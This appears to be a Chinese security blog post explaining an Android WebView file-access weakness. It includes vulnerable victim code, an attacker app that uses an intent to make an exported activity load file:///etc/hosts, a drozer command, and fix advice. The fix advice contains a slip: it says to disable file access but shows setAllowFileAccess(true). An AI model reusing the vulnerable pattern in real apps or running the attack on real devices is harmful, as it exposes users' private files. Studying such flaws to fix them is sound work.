title: android webview file域控制不严格利用
abbrlink: 3957115657
date: 2019-04-29 13:37:55
tags: 
- android安全 
- webview
---
## webview file域控制不严格读取内部私有文件
必须条件：  
1.存在webview的activity组件可导出  
2.当前的webview允许使用file协议  

可利用app关键代码:  

```
android:exported="true"//api17及以上版本默认为false
webView.getSettings().setAllowFileAccess(true);//默认是true
```

MainActivity.java  

```
public class MainActivity extends AppCompatActivity {

    private WebView webView = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity_main);
        webView = new WebView(this);
        setContentView(webView);
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setAllowFileAccess(true);
        Intent mIntent = this.getIntent();
        Bundle bundle = mIntent.getBundleExtra("bundle");
        String url = bundle.getString("url");
        webView.loadUrl(url);
    }
}
```
AndroidManifest.xml  

```
<activity android:name=".MainActivity" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" android:exported="true" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
```

攻击app关键代码:  

MainActivity.java

```

public class MainActivity extends AppCompatActivity {

    public static final String LOAD_URL="file:///etc/hosts";
//    public static final String BAIDU="https://www.baidu.com";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ComponentName componentName = new ComponentName("com.demo.victim","com.demo.victim.MainActivity");
        Intent intent = new Intent();
        Bundle bundle = new Bundle();
        intent.setComponent(componentName);
        bundle.putString("url",LOAD_URL);
        intent.putExtra("bundle",bundle);
        startActivity(intent);

    }
}
```

利用:    
先安装可利用app在安装攻击app，在打开攻击app  
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/30/01.jpg)

修复:  
设置android:exported="false" 设置为不可导出  
webView.getSettings().setAllowFileAccess(true);明确禁用file协议

工具:  
使用drozer查看activity导出  
```
run app.activity.info -a com.xx.xx
```
代码:  
[webview](https://github.com/tea9/android_repetition/tree/master/webview)  

## LINNKS
[Android WebView File域同源策略绕过漏洞浅析](https://blog.csdn.net/jltxgcy/article/details/50678304)  
[WebView域控不严格读取内部私有文件实验](https://www.freebuf.com/articles/terminal/160061.html)  
